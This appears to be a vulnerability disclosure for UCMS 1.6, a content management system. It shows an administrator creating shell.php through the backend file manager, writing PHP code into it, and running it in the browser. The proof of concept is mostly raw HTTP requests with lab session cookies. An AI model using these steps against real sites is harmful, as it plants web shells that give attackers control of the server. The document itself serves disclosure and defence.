## Arbitrary code execution vulnerability exists in UCMS 1.6

vendor: http://uuu.la/

Download link for UCMS-1.6 installation package: http://uuu.la/uploadfile/file/ucms_1.6.zip

Log in to the backend and click File Management

![image](https://user-images.githubusercontent.com/54017627/161387110-ce6f073a-cda1-4332-8d61-0c916ead4626.png)

Enter the file name shell.php to be created in the box of New File:

![image](https://user-images.githubusercontent.com/54017627/161387153-c83d861a-7f12-46e2-aa22-8e5278428297.png)

```
POST /ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6 HTTP/1.1
Host: 192.168.1.101
Content-Length: 62
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close

uuu_token=8945ab62&newfile=shell.php&submit=%E6%8F%90%E4%BA%A4
```
Mouse over the shell.php line and click Edit

![image](https://user-images.githubusercontent.com/54017627/161387252-02ed0b8c-43c3-4142-935e-c68a631dfb12.png)

```
GET /ucms_1.6/ucms/index.php?do=sadmin_fileedit&dir=/ucms_1.6/&file=shell.php HTTP/1.1
Host: 192.168.1.101
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close
```

Enter our code and click Save

![image](https://user-images.githubusercontent.com/54017627/161387344-c844e6d5-3b11-472b-ba49-a8b75b59ad36.png)

```
POST /ucms_1.6/ucms/index.php?do=sadmin_fileedit&dir=/ucms_1.6/&file=shell.php HTTP/1.1
Host: 192.168.1.101
Content-Length: 61
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_fileedit&dir=/ucms_1.6/&file=shell.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close

uuu_token=8945ab62&co=%3C%3Fphp+phpinfo%28%29%3B%3F%3E&pos=16
```
We visited the shell.php directory from the browser and found that the code had been executed successfully

directory： http://192.168.1.101/ucms_1.6/shell.php

![image](https://user-images.githubusercontent.com/54017627/161387431-66ed1b02-3dc4-423f-a1cf-6bd3dc3f9b39.png)
